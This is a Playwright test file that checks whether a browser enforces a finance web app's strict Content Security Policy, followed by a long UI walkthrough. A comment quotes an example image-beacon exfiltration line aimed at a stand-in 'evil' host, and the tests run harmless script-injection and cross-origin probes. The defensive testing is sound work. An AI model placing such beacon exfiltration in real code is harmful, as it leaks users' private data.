import { test, expect, type Page } from '@playwright/test'
import { SETTLED_RESULT } from './reviewSurface'
import { driveIntakeToResult } from './intakeDrive'
import { copy, slots } from '../src/ui/copy'
import { roughWindow, ROUGH_WINDOW_YEARS } from '../src/engine/reference/roughSequence'

/**
 * Proves a REAL browser enforces the strict CSP shipped in `vercel.json` — the in-memory decrypted
 * model's only guard against an injected page script (at-rest crypto does nothing for cleartext in
 * the JS heap). `scripts/__tests__/csp-headers.test.ts` proves the JSON *string*; this proves the
 * browser *behaviour*. Served by `scripts/serve-dist-with-headers.ts` via the config's webServer:
 *   - baseURL (127.0.0.1:4180) = the ENFORCED origin (real CSP header).
 *   - CONTROL_ORIGIN (4181)    = the SAME dist/ with NO CSP header.
 *
 * The control test is the anti-false-pass keystone: the SAME injection that is BLOCKED on the
 * enforced origin must EXECUTE on the control origin — otherwise a silently-broken injector would
 * make the blocked assertion vacuous.
 */
const CONTROL_ORIGIN = 'http://127.0.0.1:4181'
/** The shell arm's vault leg (Act 6 · RC19): a daily passphrase and a recovery word that clear the floor and differ. */
const VAULT_PASSPHRASE = 'plinth otter vivid casket 92 lampoon'
const VAULT_RECOVERY = 'lattice harbor cinder vellum 48 thicket'
/** The ENFORCED origin — the config's `baseURL`, where the build's own chunks and workers are served. */
const ENFORCED_ORIGIN = 'http://127.0.0.1:4180'

interface CspViolation {
  readonly violatedDirective: string
  readonly blockedURI: string
}

declare global {
  interface Window {
    __inlineExecuted?: boolean
    __cspViolations?: CspViolation[]
  }
}

/**
 * Installed in the MAIN page world BEFORE navigation (addInitScript, not an in-evaluate promise), so
 * it observes the page's REAL CSP violations and survives the navigation with the flag pre-seeded
 * false — distinguishing "blocked" (stays false) from "never ran".
 */
async function installCollector(page: Page): Promise<void> {
  await page.addInitScript(() => {
    window.__inlineExecuted = false
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations?.push({ violatedDirective: e.violatedDirective, blockedURI: e.blockedURI })
    })
  })
}

/**
 * The SHARED injector — identical code path on enforced and control so a broken technique cannot
 * yield a false PASS. It runs in page.evaluate's isolated world, but the <script> element it appends
 * joins the MAIN document and is therefore evaluated against the page's CSP.
 */
async function injectInlineScript(page: Page): Promise<void> {
  await page.evaluate(() => {
    const s = document.createElement('script')
    s.textContent = 'window.__inlineExecuted = true'
    document.body.appendChild(s)
  })
}

const inlineExecuted = (page: Page) => page.evaluate(() => window.__inlineExecuted)
const violations = (page: Page) => page.evaluate(() => window.__cspViolations ?? [])


test.describe('CSP — real browser enforcement', () => {
  test("blocks a runtime-injected inline <script> (script-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    await injectInlineScript(page)

    // PRIMARY proof: the inline script never executed.
    expect(await inlineExecuted(page)).toBe(false)

    // CORROBORATION: the browser reported a script-src violation (Chromium uses the granular
    // `script-src-elem` for an inline element, hence startsWith rather than ===).
    const v = await violations(page)
    expect(v.some((x) => x.violatedDirective.startsWith('script-src'))).toBe(true)

    // The enforced origin actually SENT the strict policy (guards a harness that dropped the CSP,
    // which would make the assertions above vacuous, and pins out any future `unsafe-inline` drift).
    const csp = (await page.request.get('/')).headers()['content-security-policy'] ?? ''
    expect(csp).toContain("script-src 'self'")
    expect(csp).not.toContain("'unsafe-inline'")
  })

  test('CONTROL: the same injection DOES execute when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await injectInlineScript(page)

    // If this is false the injector is broken ⇒ the enforced test was a false pass.
    expect(await inlineExecuted(page)).toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })

  test("blocks cross-origin network exfil (connect-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // The in-scope attack is exfil of the in-memory model via fetch/XHR/beacon. connect-src 'self'
    // must block a cross-origin request. The control origin (:4181) is a genuinely different origin,
    // so no internet is needed; the CSP check fires the violation BEFORE any network egress.
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* the CSP rejection is expected */
      }
    }, `${CONTROL_ORIGIN}/`)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(true)
  })

  test('CONTROL: the same cross-origin fetch raises no connect-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* a network/CORS failure, NOT a CSP violation */
      }
    }, 'http://127.0.0.1:4180/')
    // Proves the enforced violation above is caused by the CSP, not intrinsic to the cross-origin fetch.
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(false)
  })

  test("blocks a cross-origin image-beacon exfil (img-src 'self' data:)", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // A fetch-free exfil channel connect-src does NOT cover: `new Image().src = 'https://evil/?d=' + data`.
    // img-src governs sub-resource image loads, so a cross-origin image must fire an img-src violation.
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve() // a CSP block manifests as a load error; the violation fires first
          img.src = `${target}/probe.png`
        }),
      CONTROL_ORIGIN,
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(true)
  })

  test('CONTROL: the same image-beacon raises no img-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve()
          img.src = `${target}/probe.png`
        }),
      'http://127.0.0.1:4180',
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(false)
  })

  test("engine module Web Worker constructs + round-trips under worker-src 'self' — through the REAL intake", async ({ page }) => {
    // This is a full first run through the stepper (Act 6 · RC14) + the home's two engine round trips (the provisional
    // reading, then the final). Playwright's 30 s default cannot hold it on a 4-vCPU runner, and the 60 / 90 s waits
    // below are dead letters without a test budget above them (a matcher timeout never clamps to the
    // test deadline — the test dies first with a bare "Test timeout", and no custom message prints).
    // Scoped to THIS test, not the config: the fast control arms keep the default so a hang there
    // still reads as one (playwright.fit.config.ts carries the same hardware reasoning).
    test.setTimeout(180_000)
    // RETARGETED at D1 (the U0 smoke readout is gone), and at RC14 (the walk and its answer strip are gone): drives the
    // real product path — cold start → "Start a new plan" → the first-run stepper's cards and drawers → Complete → the
    // home's live engine reading — under the ENFORCED policy. Strictly stronger than the smoke arm: the worker constructs
    // at module eval, the React surface renders under style-src 'self', and the engine round-trips a transferred buffer
    // into the home's fan.
    await installCollector(page)
    await driveIntakeToResult(page)
    // Act 6 · RC4: the first run lands on the home (Dashboard → Snapshot), whose fan is the real chart under the real
    // headers: Highcharts in styled mode, its fills reaching it through the CSSOM (`--b9-fan-outer`, written once at
    // start-up), never a runtime <style>. The old band's chart-text layer left with the answer page.
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSnapshot })).toBeVisible({ timeout: 90_000 })
    const outer = page.locator('[data-card="fan"] [data-chart="fan"] .b9-fan-outer .highcharts-area').first()
    await expect(outer, 'the home drew no fan — retarget this probe at whichever chart the home carries').toBeAttached({ timeout: 90_000 })
    const painted = await outer.evaluate((el) => ({
      fill: getComputedStyle(el).fill,
      written: document.documentElement.style.getPropertyValue('--b9-fan-outer').trim(),
    }))
    expect(painted.written, 'the CSSOM write never landed on the root under the enforced CSP').not.toBe('')
    expect(painted.fill, 'the fan’s outer range painted nothing: the CSSOM custom property did not reach the chart').not.toMatch(/^(none|rgba\(0, 0, 0, 0\))$/)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'a chart injected a <style> element').toBe(0)

    // No worker-src/script-src/style-src violation anywhere along the real path — the chart render
    // above included.
    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src|style-src/.test(x.violatedDirective))).toBe(false)
  })

  test("the POOLED solve's workers construct under worker-src 'self' — a coordinator + the eval workers, alive and violation-free", async ({ page }) => {
    // The first run (above) + the invite → the pool spawn. The solve itself runs for minutes and is
    // never awaited: this arm proves the pool's members construct and LIVE under the enforced policy.
    test.setTimeout(240_000)
    // The pool's size is a function of the device (`poolSizeFor`: every core but two). Pin the device
    // to 4 logical cores so the arm is P = 2 on every runner — CDP-injected, so the CSP never sees it,
    // and before the app's module evaluates (the engine client reads it once, at construction).
    await page.addInitScript(() => {
      Object.defineProperty(Navigator.prototype, 'hardwareConcurrency', { configurable: true, get: () => 4 })
    })
    await installCollector(page)
    await driveIntakeToResult(page)
    await expect(page.locator(SETTLED_RESULT), 'no final-tier verdict — the invite cannot mount').toBeAttached({ timeout: 120_000 })
    expect(page.workers(), 'before the solve: the spine worker alone').toHaveLength(1)

    // Act 6 · RC8: Tax → Tax Strategies' empty state: the goal on the page's own radio, then Find.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleTax, exact: true }).click()
    const find = page.getByRole('button', { name: copy.taxStratFind, exact: true })
    await expect(find, 'Find never mounted').toBeVisible({ timeout: 60_000 })
    await page.getByRole('radio', { name: new RegExp(copy.goalPayLessTaxLabel) }).check()
    await find.click()
    await expect(page.locator('[data-calculating]'), 'the solve never went pending').toBeAttached({ timeout: 30_000 })

    // The spine + ONE coordinator + TWO eval workers, all through the one `new URL` literal.
    await expect.poll(() => page.workers().length, { message: 'the pool never spawned', timeout: 30_000 }).toBe(4)
    // ALIVE, not merely constructed: a member that failed to load under the policy fires its `error`
    // event, and the lane tears EVERY member down and retries on the spine (page.workers() → 1). The
    // window is far past a cached chunk's load; the solve is still minutes from done.
    await page.waitForTimeout(10_000)
    expect(page.workers(), 'a pool member died — the lane tore down').toHaveLength(4)
    await expect(page.locator('[data-calculating]'), 'the solve settled inside the window — the arm proved nothing about a LIVE pool').toBeAttached()

    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src/.test(x.violatedDirective))).toBe(false)
  })

  test('the shell loads under the enforced CSP: the home, Probability and its Action Items tray, Confidence, Comparisons, Retirement Details and Savings, Cash Flows, Stress Test, Social Security, Health Care, Asset Allocation and Tax Allocation (the chart cascade), Tax Strategies, Net Worth and one Profile drawer, Expenses and its Living expenses drawer, Settings and the Display drawer, both its menus, then the save drawer, a reload, a refused and a right unlock and the re-entry gate back to the home, no violation, and no request outside the build’s own files', async ({ page }) => {
    // Act 6 · RC2 (plan 6, section 3.1's Verification; the workbench room's arm before it, U6 to U15), re-pointed at RC4:
    // the real intake lands on the home (Dashboard → Snapshot), the shell's lazy chunk and its styles load with it on the
    // served build, Probability draws its rings and its two balance bars (Highcharts again), and every page is
    // visited (the last interim tab, the facts page, left with RC13b). ANY violation reds (not a directive subset), and so does any request that leaves the build's own origin:
    // the act adds no network call. The table runs both views on the build's own engine worker, each one short run: the
    // steady view lands first, then the future select shows the rough one, each read by its own words over its own rows; a
    // drill opens and goes back, the CSV downloads (a blob built in the page), and the Accounts tab opens. Expenses
    // opens and closes its Living expenses drawer (RC13b, in place of the facts page's step sheet); Probability's Action Items tray (RC4b: a Base UI collapsible, its Edit drawer a
    // portaled dialog) runs one what-if through its Refresh, and its "Today's dollars" opens the Display drawer (RC18, a portaled
    // dialog with two Base UI switches); the gear opens Settings (RC18, in place of the assumption panel), whose folder tabs
    // are walked and whose survivor row opens the Living expenses drawer over it; the lock menu (a portaled Base UI menu)
    // opens and closes; at a phone width the menu (a portaled Base UI dialog that animates) moves the page. The way home
    // is the wordmark.
    // Act 6 · RC19 folded the kit probe arm in here (plan 5.2; the probe page is deleted): every probe part a real screen
    // draws is visited by this arm. The drawer (a Profile drawer, focus back on its opener), the picker, the switch, the
    // folder tabs, the chart title's menu, the tray, the data table and a chart's tooltip and legend were already here;
    // the Add menu rides the real intake (`driveIntakeToResult`'s account), and this arm adds the slider (Stress Test),
    // the accessibility module's hidden region and the credit (Confidence's fan), and the probe's cascade read (a new
    // kind of check since RC1: the colour-blind second cue on a Highcharts chart) on Tax Allocation, the first screen
    // here whose hatched series this household always draws (its one 401(k) is pre-tax, hatched in slot 2's ink), with
    // the palette read on Asset Allocation's solid stock slice. Then RC19's own screens: the save drawer from the lock
    // menu (passphrase, recovery word, the backup, the done state), a reload to the unlock card, a refused passphrase
    // with its words, the right one, and the re-entry gate's affirm back to the home. Its control pair (a planted
    // `<style>`, blocked and applied) runs on the cold start, below. The kit's Tooltip and ScrollArea render in no screen
    // yet, and the Toast only on a waiting service worker (the update prompt), which no single build can produce.
    test.setTimeout(240_000)
    await installCollector(page)
    const outside: string[] = []
    page.on('request', (r) => {
      const url = new URL(r.url())
      if (url.protocol === 'data:' || url.protocol === 'blob:') return
      if (url.origin !== ENFORCED_ORIGIN) outside.push(r.url())
    })
    await driveIntakeToResult(page)
    // Act 6 · RC4: the first run's end lands on the home, Dashboard → Snapshot (no answer page, no door), the app's first
    // Highcharts chart under the real header (the fan, its lazy chunk, highcharts-more and the accessibility module, its
    // styled-mode CSS and its hover tooltip).
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSnapshot })).toBeVisible({ timeout: 120_000 })
    expect(await page.evaluate(() => history.state)).toEqual({ b9: 'workspace', n: 1 })
    expect(new URL(page.url()).hash).toBe('#/dashboard/snapshot')
    await expect(page.locator('main.result'), 'exactly one main.result in the shell').toHaveCount(1)
    const fan = page.locator('[data-card="fan"] [data-chart="fan"]')
    await expect(fan.locator('.highcharts-series-group'), 'the fan never drew under the CSP').toBeAttached({ timeout: 60_000 })
    await expect(fan.locator('.highcharts-data-label text', { hasText: copy.snapshotFanOuterWords }), 'the fan’s band words').toBeAttached()
    await fan.evaluate((el) => el.scrollIntoView({ block: 'center' }))
    const plot = (await fan.locator('.highcharts-plot-background').boundingBox())!
    await page.mouse.move(plot.x + plot.width * 0.45, plot.y + plot.height / 2)
    await page.mouse.move(plot.x + plot.width / 2, plot.y + plot.height / 2, { steps: 5 })
    await expect(fan.locator('.highcharts-tooltip'), 'the fan’s tooltip never showed').toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the fan injected a <style> element').toBe(0)
    await page.mouse.move(0, 0)
    // Retirement → Analysis → Probability (RC4): the two rings and the two balance bars (each its own Highcharts chart)
    // once the settled answer's what-if side reads the plan itself; the left picker (a portaled Base UI select) opened
    // and closed.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleRetirement, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.analysisTitle })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/analysis/probability')
    await expect(page.locator('[data-ring-half="compared"]'), 'the plan’s ring never drew').toBeVisible({ timeout: 60_000 })
    // The first run's household reads off track with a $0 middle balance, so its bars give way to their words (the bar charts'
    // own CSP proof is the home's fan above and Investment's donuts below); either way, one of the two stands.
    await expect(page.locator('[data-bar="compared"] .highcharts-series-group, [data-bar-none]').first(), 'neither the bar nor its words').toBeAttached({
      timeout: 60_000,
    })
    await page.locator('[data-half="alternative"]').getByRole('combobox').click()
    await expect(page.getByRole('listbox'), 'the picker never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('listbox')).toHaveCount(0)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Probability injected a <style> element').toBe(0)
    // The plan list drawer (RC5): the pencil beside the right picker opens it; Done closes it.
    await page.getByRole('button', { name: copy.planListOpenLabel }).click()
    const planList = page.getByRole('dialog', { name: copy.planListTitle })
    await expect(planList, 'the plan list never opened').toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the plan list injected a <style> element').toBe(0)
    await planList.getByRole('button', { name: copy.planListDone }).click()
    await expect(planList).toHaveCount(0)
    // Confidence (RC7): the fan full size, and on the retired route the run-out chart lined up under it (a Highcharts area
    // chart, the clone's first, rebuilt on the fan's plot box); its legend toggled and back. Then Probability again.
    await page.getByRole('tab', { name: copy.confidenceTab }).click()
    await expect(page.getByRole('heading', { level: 2, name: copy.confidenceChartTitle })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/analysis/confidence')
    const confFan = page.locator('[data-confidence] [data-chart="fan"]')
    await expect(confFan.locator('.highcharts-series-group'), 'Confidence’s fan never drew under the CSP').toBeAttached({ timeout: 30_000 })
    await expect(page.locator('[data-chart="runout"] .highcharts-series-group, [data-runout-stopgap]').first(), 'neither the run-out chart nor its stopgap').toBeAttached({ timeout: 30_000 })
    await confFan.locator('.highcharts-legend-item', { hasText: copy.snapshotFanOuter }).click()
    await confFan.locator('.highcharts-legend-item', { hasText: copy.snapshotFanOuter }).click()
    // The probe's chart checks, on a real chart (RC19): the accessibility module drew its hidden screen-reader region, and
    // the licence's credit stands (plan 2.1 decision 5).
    await expect(confFan.locator('[id^="highcharts-screen-reader-region-before-"]'), 'the accessibility module drew no screen-reader region').toBeAttached()
    await expect(confFan.locator('.highcharts-credits'), 'the credit is gone').toHaveText('Highcharts.com')
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Confidence injected a <style> element').toBe(0)
    // RC17's three tabs: Comparisons' overlapping areas (its chart menu, a portaled Base UI menu, opened to the bars as
    // retirement begins), Retirement Details' year columns (the new `incomeSourcesOptions` chart, its patterns and, where the
    // money runs out, its plot band) and Savings; each draws its chart or the words in its place, and none injects a <style>.
    for (const [tab, hash, chart] of [
      [copy.comparisonsTab, 'comparisons', 'cmp-pair'],
      [copy.retirementDetailsTab, 'retirement-details', 'rd-years'],
      [copy.analysisSavingsTab, 'savings', 'sav-bars'],
    ] as const) {
      await page.getByRole('tab', { name: tab, exact: true }).click()
      expect(new URL(page.url()).hash).toBe(`#/retirement/analysis/${hash}`)
      await expect(page.locator(`[data-chart="${chart}"] .highcharts-series-group, [data-analysis-words]`).first(), `${hash}: neither its chart nor its words`).toBeAttached({ timeout: 60_000 })
      // The waiting words are not the tab's picture: past them, so the chart (or its own words) is what the CSP saw drawn.
      await expect(page.locator('[data-analysis-words]', { hasText: copy.analysisRunsWaiting }), `${hash}: still working out the plans`).toHaveCount(0, { timeout: 60_000 })
      expect(await page.evaluate(() => document.querySelectorAll('style').length), `${hash} injected a <style> element`).toBe(0)
    }
    await page.getByRole('tab', { name: copy.comparisonsTab, exact: true }).click()
    await page.locator('[data-analysis-panel="comparisons"] h2 button').click()
    await page.getByRole('menuitemradio', { name: copy.cmpChartAtRetirement }).click()
    await expect(page.locator('[data-chart="cmp-bars"] .highcharts-series-group, [data-analysis-words]').first(), 'the bars as retirement begins').toBeAttached({ timeout: 30_000 })
    await expect(page.locator('[data-analysis-words]', { hasText: copy.analysisRunsWaiting }), 'the bars: still working out the plans').toHaveCount(0, { timeout: 30_000 })
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the chart menu injected a <style> element').toBe(0)
    await page.getByRole('tab', { name: copy.probabilityTab }).click()
    await expect(page.locator('[data-ring-half="compared"]'), 'back on Probability').toBeVisible({ timeout: 30_000 })
    // On to Retirement → Cash Flows (RC6: the kit's DataTable, its Selects, a drill, the Accounts tab, and the CSV handed
    // to the browser as a file built in the page, a blob, with no request).
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageCashFlows, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageCashFlows })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/cash-flows')

    const firstLine = page.locator('[data-cash-flows-lines] p').first()
    const frame = page.locator('[data-table-frame]')
    await expect(frame, 'the steady view’s rows never landed').toBeVisible({ timeout: 60_000 })
    await expect(firstLine, 'the steady view’s words').toHaveText(copy.workbenchSteadyWhat)
    await page.locator('[data-cash-flows-controls]').getByRole('combobox', { name: copy.workbenchViewLegend }).click()
    await page.getByRole('option', { name: copy.workbenchViewRough, exact: true }).click()
    const roughStart = roughWindow().startYear
    await expect(firstLine, 'the rough view’s words').toHaveText(
      slots.workbenchRoughWhat(roughStart, roughStart + ROUGH_WINDOW_YEARS - 1, ROUGH_WINDOW_YEARS),
    )
    await expect(frame, 'the rough view’s rows').toBeVisible()
    await expect(page.locator('[data-table-frame][data-busy]')).toHaveCount(0)
    await frame.locator('thead button').first().click()
    await expect(page.locator('[data-cash-flows-title]')).toContainText('/')
    await page.locator('[data-cash-flows-title]').getByRole('button', { name: copy.cashFlowsTabSummary }).click()
    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: copy.cashFlowsDownloadLabel }).click()])
    expect(download.suggestedFilename(), 'the CSV arrives as a file').toMatch(/^cash-flows-.*\.csv$/)
    await page.getByRole('tab', { name: copy.cashFlowsTabAccounts }).click()
    await expect(page.getByRole('combobox', { name: copy.cashFlowsAccountsLabel })).toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Cash Flows injected a <style> element').toBe(0)

    // Retirement → Social Security (RC9): its strategy runs on their own slots (the first run's household, 65 and 63, both
    // claiming at 67, always has a choice), the yearly pairs, the running totals with the crossing's ring (a scatter
    // mark), Summary's bars on a category axis, and the filing steps in the tray.
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageSocialSecurity, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSocialSecurity })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/social-security')
    await expect(page.locator('[data-chart="claims-annual"] .highcharts-series-group'), 'the yearly pairs never drew').toBeAttached({ timeout: 120_000 })
    await page.getByRole('button', { name: copy.claimsChartAnnual }).click()
    await page.getByRole('menuitemradio', { name: copy.claimsChartCumulative, exact: true }).click()
    await expect(page.locator('[data-chart="claims-cumulative"] .highcharts-series-group'), 'the running totals never drew').toBeAttached({ timeout: 60_000 })
    await page.getByRole('tab', { name: copy.claimsTabSummary }).click()
    await expect(page.locator('[data-chart="claims-summary"] .highcharts-series-group'), 'Summary never drew').toBeAttached({ timeout: 120_000 })
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    await expect(page.locator('[data-claims-steps]'), 'the filing steps never opened').toBeVisible()
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Social Security injected a <style> element').toBe(0)

    // Retirement → Health Care (RC10): its four small charts (each its own Highcharts chart, the cliff's bracket a line
    // series) or the page's own words where the first run's household prices no health premiums, and its Action Items tray.
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageHealthCare, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageHealthCare })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/health-care')
    await expect(page.locator('[data-chart="health-extras"] .highcharts-series-group, [data-health-page]').first(), 'neither the charts nor the page’s words').toBeAttached({ timeout: 120_000 })
    if ((await page.locator('[data-health-charts]').count()) > 0) {
      await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
      await expect(page.locator('[data-health-tray]'), 'the health tray never opened').toBeVisible()
      await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    }
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Health Care injected a <style> element').toBe(0)

    // Retirement → Stress Test (RC11): its stresses on their own slots, the bars (Baseline outlined, Combined in the shared
    // cross pattern where two stresses run) on a category axis, and its tray's sliders and Edit drawer.
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageStressTest, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageStressTest })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/stress-test')
    await expect(page.locator('[data-chart="stress"] .highcharts-series-group'), 'the stress bars never drew').toBeAttached({ timeout: 120_000 })
    await expect(page.locator('[data-stress] [aria-busy="true"]'), 'a stress run never landed').toHaveCount(0, { timeout: 240_000 })
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    await expect(page.locator('#b9-stress-items [data-tray-row]').first(), 'the stress tray never opened').toBeVisible()
    // The kit's slider (RC19, from the probe): one key press moves it, one brings it back.
    const slider = page.locator('#b9-stress-items').getByRole('slider').first()
    const was = await slider.getAttribute('aria-valuenow')
    await slider.focus()
    await slider.press('ArrowRight')
    await expect(slider, 'the slider never moved').not.toHaveAttribute('aria-valuenow', was ?? '')
    await slider.press('ArrowLeft')
    await expect(slider, 'the slider never came back').toHaveAttribute('aria-valuenow', was ?? '')
    await page.getByRole('button', { name: copy.trayEdit, exact: true }).click()
    await expect(page.getByRole('dialog', { name: copy.stressEditTitle }), 'the Edit drawer never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Stress Test injected a <style> element').toBe(0)

    // Investment (RC12): Asset Allocation's two rings (a pie series in core Highcharts, the patterned slices), its picker opened and its
    // Detail tab; Tax Allocation's ring, a part picked by its figure.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleInvestment, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageAssetAllocation })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/investment/asset-allocation')
    await expect(page.locator('[data-chart="mix-current"] .highcharts-series-group'), 'the current ring never drew').toBeAttached({ timeout: 60_000 })
    await page.locator('[data-asset-side="current"] [role="combobox"]').click()
    await expect(page.getByRole('option', { name: copy.assetScopeAll, exact: true }), 'the picker never opened').toBeVisible()
    await page.keyboard.press('Escape')
    // The probe's palette read (RC19): the solid stock slice (slot 6) paints palette.ts's own colour, written once through
    // the CSSOM, so neither highcharts.css nor Highcharts' default palette won.
    const { RC_SERIES } = await import('../src/viz/palette')
    const rgbOf = (h: string) => `rgb(${parseInt(h.slice(1, 3), 16)}, ${parseInt(h.slice(3, 5), 16)}, ${parseInt(h.slice(5, 7), 16)})`
    const palette = await page.evaluate(() => ({
      root: getComputedStyle(document.documentElement).getPropertyValue('--highcharts-color-0').trim(),
      stock: (() => {
        const el = document.querySelector('[data-chart="mix-current"] .highcharts-point.b9-donut-part--stock')
        return el ? getComputedStyle(el).fill : 'MISSING'
      })(),
    }))
    expect(palette.root, 'the CSSOM write of --highcharts-color-0 did not land').toBe(RC_SERIES[0])
    expect(palette.stock, 'the stock slice is not painted from palette.ts (highcharts.css or its default palette won)').toBe(rgbOf(RC_SERIES[6]))
    await page.getByRole('tab', { name: copy.assetTabDetail, exact: true }).click()
    await expect(page.locator('[data-asset-detail-row]').first(), 'Detail never showed').toBeVisible()
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageTaxAllocation, exact: true }).click()
    await expect(page.locator('[data-chart="tax-allocation"] .highcharts-series-group'), 'the tax ring never drew').toBeAttached({ timeout: 60_000 })
    // The probe's cascade read, moved here (RC19): the household's one pre-tax part is hatched, its fill from the shared
    // defs' `url("#b9-hatch")` (highcharts.css sits inside the charts layer, so it never strips it), the pattern built into
    // this chart, and its ink this part's own colour (slot 2), never the shared fallback.
    const cascade = await page.evaluate(() => {
      const chart = document.querySelector('[data-chart="tax-allocation"]')
      const point = chart?.querySelector('.highcharts-point.b9-hatch') ?? null
      const ink = chart?.querySelector('pattern#b9-hatch .b9-pattern-ink') ?? null
      return {
        fill: point ? getComputedStyle(point).fill : 'MISSING',
        pattern: chart?.querySelectorAll('pattern#b9-hatch').length ?? 0,
        ink: ink ? getComputedStyle(ink).stroke : 'MISSING',
      }
    })
    expect(cascade.pattern, 'the shared defs built no #b9-hatch pattern into the chart').toBeGreaterThan(0)
    expect(cascade.fill, 'the hatched part lost its pattern fill').toBe('url("#b9-hatch")')
    expect(cascade.ink, 'the hatch’s ink is not its part’s colour (slot 2)').toBe(rgbOf(RC_SERIES[2]))
    await page.locator('[data-taxalloc-part]').first().click()
    await expect(page.locator('[data-taxalloc-account]').first(), 'a part’s accounts never listed').toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Investment injected a <style> element').toBe(0)

    // Tax → Tax Strategies (RC8): its folder tabs (the page's own state), the empty state's goal radios and Find, and
    // Summary's waiting words before a solve; the solve's own workers are the pooled arm's above.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleTax, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageTaxStrategies })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/tax/strategies')
    await expect(page.getByRole('button', { name: copy.taxStratFind, exact: true }), 'Find never showed').toBeVisible()
    await page.getByRole('radio', { name: new RegExp(copy.goalLeaveMoreLabel) }).check()
    await expect(page.locator('[data-heir-bracket]'), 'the heirs’ bracket beside the leave-more pick').toBeVisible()
    await page.getByRole('tab', { name: copy.taxStratTabSummary }).click()
    await expect(page.locator('[data-summary="waiting"]'), 'Summary’s words before a solve').toBeVisible()
    await page.getByRole('tab', { name: copy.taxStratTabStrategies }).click()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Tax Strategies injected a <style> element').toBe(0)

    // The lock menu: a portaled menu, opened and closed by Escape.
    await page.getByRole('button', { name: new RegExp(`^${copy.lockMenuLabel}`) }).click()
    await expect(page.getByRole('menu'), 'the lock menu never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('menu')).toHaveCount(0)

    // Profile (RC13a): the Profile word lands on Net Worth; one Profile drawer (a portaled, animated dialog, the kit's Select
